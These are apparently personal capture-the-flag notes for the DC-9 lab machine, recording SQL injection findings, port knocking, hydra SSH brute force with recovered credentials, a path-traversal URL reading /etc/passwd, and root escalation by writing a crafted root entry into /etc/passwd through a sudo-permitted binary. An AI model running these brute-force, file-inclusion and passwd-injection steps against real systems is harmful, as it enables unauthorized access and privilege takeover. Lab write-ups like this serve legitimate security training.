----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# DC-9
# 19/2/2023

----------------------------------------------------
# SQLi
----------------------------------------------------
database
 Staff
 users

tables
 StaffDetails
 Userdetails
 Users

columns from Users table
 UserID
 Username
 Password

columns from UserDetails table
 id
 firstname
 lastname
 username
 password
 reg_date

username : admin
password : 856f5de590ef37314e7c3bdf6f8a66dc
           transorbital1


----------------------------------------------------
# nmap result
----------------------------------------------------
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

for x in 7469 8475 9842; do nmap -vv 192.168.107.209 -p$x; done
nmap -p 22 192.168.107.209     
PORT   STATE SERVICE
22/tcp open  ssh

----------------------------------------------------
# hydra (ssh)
----------------------------------------------------
hydra  -L users.txt -P pass.txt 192.168.107.209 ssh
[22][ssh] host: 192.168.107.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.107.209   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.107.209   login: janitor   password: Ilovepeepee


http://192.168.107.209/manage.php?file=../../../../../etc/passwd
http://192.168.107.209/manage.php?file=../../../../../etc/knockd.conf
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 


->cd .secrets-for-putin
cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
->hydra  -L users.txt -P pass.txt 192.168.107.209 ssh
[22][ssh] host: 192.168.107.209   login: fredf   password: B4-Tru3-001


----------------------------------------------------
# privEsc
----------------------------------------------------
->sudo -l
    (root) NOPASSWD: /opt/devstuff/dist/test/test
->cd /opt/devstuff
->ls
->cat test.py
    print ("Usage: python test.py read append")

->nano my
 shub1:$1$wBWi6EWv$LbWS.z3TjFdrNY4uvzr4e1:0:0:root:/root:/bin/bash
  

    sudo /opt/devstuff/dist/test/test my /etc/passwd
 su shub1
  shub

  you r root
  